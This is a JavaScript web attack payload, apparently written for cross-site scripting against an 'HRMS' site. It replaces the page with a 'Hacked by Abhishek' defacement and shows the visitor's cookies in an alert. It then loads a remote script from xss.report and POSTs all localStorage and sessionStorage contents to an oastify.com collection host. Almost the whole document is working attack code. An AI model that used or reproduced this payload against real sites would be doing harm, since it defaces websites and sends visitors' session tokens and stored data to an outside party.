// Clear the current content of the body
document.body.innerHTML = "";

// Set the document title
document.title = "Hacked by Abhishek";

// Create and append new elements
var newHeader = document.createElement('h1');
newHeader.textContent = "This website is under Abhishek's control now!\nYour cookies are stolen";
document.body.appendChild(newHeader);

var newParagraph = document.createElement('p');
newParagraph.textContent = "Welcome to the new version of the HRMS website.";
document.body.appendChild(newParagraph);

// Create and append the image
var newImage = document.createElement('img');
newImage.src = "https://cdn.vectorstock.com/i/1000x1000/01/05/message-you-have-been-hacked-vector-20550105.webp";
newImage.alt = "You have been hacked";
newImage.style.maxWidth = "60%";
document.body.appendChild(newImage);

// Apply hacker style
document.body.style.fontFamily = "'Courier New', Courier, monospace";
document.body.style.backgroundColor = "#000";
document.body.style.color = "#0f0";
document.body.style.margin = "0";
document.body.style.padding = "20px";
document.body.style.overflow = "hidden";

// Style the header
newHeader.style.fontSize = "2em";
newHeader.style.textAlign = "center";
newHeader.style.marginBottom = "20px";
newHeader.style.textShadow = "0 0 10px #0f0, 0 0 20px #0f0";

// Style the paragraph
newParagraph.style.fontSize = "1.2em";
newParagraph.style.textAlign = "center";
newParagraph.style.marginBottom = "20px";
newParagraph.style.textShadow = "0 0 5px #0f0";

// Style the image
newImage.style.display = "block";
newImage.style.margin = "0 auto";
newImage.style.marginTop = "20px";
newImage.style.boxShadow = "0 0 30px #0f0";

// Create glitch effect using CSS animations
var style = document.createElement('style');
style.textContent = `
@keyframes glitch {
  0% { transform: translate(0); }
  20% { transform: translate(-2px, 2px); }
  40% { transform: translate(-2px, -2px); }
  60% { transform: translate(2px, 2px); }
  80% { transform: translate(2px, -2px); }
  100% { transform: translate(0); }
}
h1, p, img {
  animation: glitch 1s infinite;
}
`;
document.head.appendChild(style);

// Alert cookies
alert("Here are your cookies: " + document.cookie);

// Dynamically load an external script
var script = document.createElement('script');
script.src = "https://xss.report/c/abhishekdirisipo";
document.head.appendChild(script);

// Function to get all localStorage data
function getAllLocalStorage() {
    let localStorageObject = {};
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        localStorageObject[key] = localStorage.getItem(key);
    }
    return localStorageObject;
}

// Function to get all sessionStorage data
function getAllSessionStorage() {
    let sessionStorageObject = {};
    for (let i = 0; i < sessionStorage.length; i++) {
        let key = sessionStorage.key(i);
        sessionStorageObject[key] = sessionStorage.getItem(key);
    }
    return sessionStorageObject;
}

// Function to send storage data to the server
async function sendStorageToServer(url) {
    let data = {
        localStorage: getAllLocalStorage(),
        sessionStorage: getAllSessionStorage()
    };

    console.log('Data to be sent:', data);  // Log the data before sending

    try {
        let response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data),
            mode: 'no-cors'  // This mode allows the request but you won't be able to access the response
        });
        console.log('Request sent with no-cors mode');
    } catch (error) {
        console.error('Error sending storage data:', error);
    }
}

// Usage example1
sendStorageToServer('https://3eirmuc7kqy4p8jcvdz1g2x9107rvhj6.oastify.com');
